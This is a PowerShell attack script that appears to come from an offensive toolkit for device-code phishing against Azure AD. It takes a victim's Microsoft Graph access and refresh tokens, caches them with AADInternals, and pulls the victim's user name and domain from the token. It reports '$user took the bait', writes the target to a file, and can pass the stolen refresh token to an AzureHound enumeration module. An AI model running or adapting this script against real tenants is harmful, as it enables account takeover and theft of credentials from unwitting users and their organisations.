[CmdletBinding()]
param (
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [switch]$azureHound
)

$modules = .\Scripts\Import.ps1

# Check if $Token has been specified and is not null or empty
if ([string]::IsNullOrWhiteSpace($Token)) {
    # If $Token is not specified, just call Get-AzureToken for Graph
    Write-Output "`$Token is not specified. Generating new device code."
    Invoke-ClearToken -Token All
    Write-Output "Clearing any previous tokens for a clean run."
    Get-AzureToken -Client Graph    
} else {
    # If $Token is specified, use it with the CaptureCode parameter
    Write-Output "Using specified access token $Token."
    Get-AzureToken -Client Graph -CaptureCode $Token
}


Write-Output "Victim authentication flow"
Write-Output "Response value is $response"

$access = $response.access_token
$refresh = $response.refresh_token

Add-AADIntAccessTokenToCache -AccessToken $access -RefreshToken $refresh

# Target details constructed from token   
$acc = Read-AADIntAccessToken $access
$user = $acc.upn
$domain = $user.Split("@")[1]
Write-Output "$user took the bait."

# Other process listens for creation of this file, validates target with feedback from the token
$switch = "$user"
$switch | Out-File -Path .\target.txt 

# AzureHound
if($azureHound){
    Write-Output "Starting Azurehound module..."
    .\azurehound.ps1 -domain $domain -refreshToken $response.refresh_token
}


Read-Host "Not done with you yet, hoss."

# # Initialize or wait for $response to be set
# $response = $null

# # Continuously check for $response
# while ($true) {
#     # Logic to set $response goes here
#     # ...

#     # Check if $response is no longer $null
#     if ($null -ne $response) {
#         # Write $response to a file
#         $response | Out-File "response.txt"
        
#         notepad .\response.txt
#         # Optionally break the loop if you're done with processing
#         break
#     }

#     # Wait for a short period before checking again to avoid high CPU usage
#     Start-Sleep -Seconds 2
# }